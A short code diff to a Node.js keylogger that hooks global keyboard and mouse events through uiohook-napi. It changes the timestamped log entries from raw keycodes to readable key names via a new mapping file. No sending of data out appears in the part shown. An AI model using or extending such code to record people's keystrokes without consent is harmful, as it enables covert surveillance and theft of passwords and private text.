@@ -1,6 +1,7 @@
 // src/keylogger.js
 
 const { uIOhook } = require('uiohook-napi');
+const { keycodesMapping } = require('./keycodes');
 
 function throttle(callback, limit) {
   let waiting = false;
@@ -31,12 +32,12 @@ class Keylogger {
   
     uIOhook.on('keydown', (e) => {
       const timestamp = this.getFormattedTime();
-      this.logEntries.push(`${timestamp}: Keycode ${e.keycode}`);
+      this.logEntries.push(`${timestamp}: Keyboard Button Press : ${keycodesMapping[e.keycode]}`);
     });
 
     uIOhook.on('mousedown', (e) => {
       const timestamp = this.getFormattedTime();
-      this.logEntries.push(`${timestamp}: Mouse button ${e.button} down`);
+      this.logEntries.push(`${timestamp}: Mouse Button Press : ${e.button}`);
     });
   
     const throttledMouseMove = throttle((e) => {
